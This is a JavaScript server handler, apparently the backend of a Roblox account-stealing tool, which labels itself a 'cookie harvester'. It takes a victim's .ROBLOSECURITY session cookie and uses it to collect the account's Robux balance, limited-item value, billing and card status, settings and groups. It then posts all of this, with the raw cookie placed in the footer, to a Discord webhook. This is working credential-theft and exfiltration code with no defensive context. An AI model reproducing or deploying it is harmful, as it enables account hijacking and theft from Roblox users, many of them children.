const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper: fetch user ----------
async function getUser(userId, cookie) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("User fetch failed");
  const data = await res.json();
  return {
    id: data.id,
    name: data.name,
    displayName: data.displayName,
    created: data.created
  };
}

function getAgeDays(createdDate) {
  const created = new Date(createdDate);
  const now = new Date();
  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
}

// ---------- Helper: robux balance ----------
async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0, pending: 0 };
}

// ---------- Helper: rap & owned limiteds ----------
async function getRapAndOwned(userId, cookie) {
  let allAssets = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    allAssets.push(...(data.data || []));
    cursor = data.nextPageCursor;
  } while (cursor);

  let totalRap = 0;
  for (const asset of allAssets) {
    try {
      const detail = await fetch(`https://economy.roblox.com/v1/assets/${asset.assetId}/details`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      if (detail.ok) {
        const json = await detail.json();
        totalRap += json.RecentAveragePrice || 0;
      }
      await new Promise(r => setTimeout(r, 30));
    } catch (e) {}
  }
  return { rap: totalRap, owned: allAssets.length };
}

// ---------- Helper: billing (with fallback) ----------
async function getBilling(cookie) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    return defaultBilling;
  }
}

// ---------- Helper: played/passes (MM2, ADM, GAD) ----------
async function getPlayedPasses() {
  return [
    { name: "MM2", played: "False", passes: 0 },
    { name: "ADM", played: "False", passes: 0 },
    { name: "GAD", played: "True", passes: 0 }
  ];
}

// ---------- Helper: settings ----------
async function getSettings(cookie) {
  const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
  try {
    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return defaultSettings;
    const data = await res.json();
    return {
      verified: data.IsVerified ? "True" : "False",
      disabled: data.IsDisabled ? "True" : "False",
      enabled: data.Email ? "True" : "False"
    };
  } catch (e) {
    return defaultSettings;
  }
}

// ---------- Helper: collectibles (three falses) ----------
async function getCollectibles() {
  return ["False", "False", "False"];
}

// ---------- Helper: groups ----------
async function getGroups(userId, cookie) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return { owned: 0, funds: 0 };
    const data = await res.json();
    const owned = data.data?.length || 0;
    return { owned, funds: 0 };
  } catch (e) {
    return { owned: 0, funds: 0 };
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) {
    return res.status(400).json({ error: "Missing cookie or rbxuid" });
  }

  if (!WEBHOOK_URL) {
    console.error("WEBHOOK_URL not set");
    return res.status(500).json({ error: "Server config error" });
  }

  try {
    const user = await getUser(rbxuid, cookie);
    const robux = await getRobux(rbxuid, cookie);
    const rapData = await getRapAndOwned(rbxuid, cookie);
    const billing = await getBilling(cookie);
    const playedPasses = await getPlayedPasses();
    const settings = await getSettings(cookie);
    const collectibles = await getCollectibles();
    const groups = await getGroups(rbxuid, cookie);

    const accountAge = getAgeDays(user.created);
    const placeVisits = 0;
    const summary = robux.balance + rapData.rap;

    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");

    // Build embed – cookie goes into footer (2048 char limit)
    // Ensure footer text does not exceed 2048
    let footerText = `made by vyro28 • cookie harvester\n⚠️ ${cookie.substring(0, 1900)}`; // leave room for prefix
    if (footerText.length > 2048) {
      footerText = footerText.substring(0, 2045) + "...";
    }

    const embed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0xFF69B4,
      fields: [
        {
          name: "📌 About User",
          value: `**${user.name}** (${user.displayName})\n🆔 \`${user.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `💰 **Balance:** ${robux.balance}\n💰 **Pending:** ${robux.pending}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Rap",
          value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`,
          inline: true
        },
        {
          name: "🎮 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `${summary}`,
          inline: false
        },
        {
          name: "⚙️ Settings",
          value: `(Verified) ${settings.verified}\nDisabled ${settings.disabled}\nEnabled ${settings.enabled}`,
          inline: true
        },
        {
          name: "🎁 Collectibles",
          value: collectibles.join("\n"),
          inline: true
        },
        {
          name: "🏛️ Groups",
          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
          inline: true
        }
      ],
      footer: { text: footerText },
      timestamp: new Date().toISOString()
    };

    // Send single message to Discord
    const discordRes = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
    });

    const responseText = await discordRes.text();
    console.log(`Discord status: ${discordRes.status}`);
    console.log(`Discord body: ${responseText}`);

    if (!discordRes.ok) {
      throw new Error(`Discord returned ${discordRes.status}: ${responseText}`);
    }

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: `Failed to harvest: ${err.message}` });
  }
}
